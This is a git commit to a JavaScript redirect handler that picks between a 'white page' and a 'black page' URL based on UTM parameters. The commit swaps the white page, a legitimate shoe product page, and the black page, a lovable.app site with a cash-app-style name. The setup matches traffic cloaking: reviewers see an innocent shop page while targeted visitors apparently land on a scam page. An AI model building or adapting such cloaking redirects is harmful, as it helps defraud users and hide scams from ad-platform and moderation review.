e7e1ad1cfb71c0c368cee2bc9b0e4b783e3f7b1b
Ahmadfarhan67 <123234895+Ahmadfarhan67@users.noreply.github.com>
2026-03-11 07:32:42 +0500

    Update redirect.js

--- api/redirect.js
+++ api/redirect.js
@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://shop.channellock.com/products/pc-1";
-    const blackPageURL = "https://cashhpplogos.lovable.app";
+    const whitePageURL = "https://www.nameit.com/en-it/ni-lmtd-all/ni-lmtd-shoes/shoes/midi-boots-13248115_BlackCoffee.html";
+    const blackPageURL = "https://mintycashap.lovable.app";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
@@ -26,6 +26,7 @@ export default function handler(req, res) {
     res.end();
 
   }
+
 
 
 
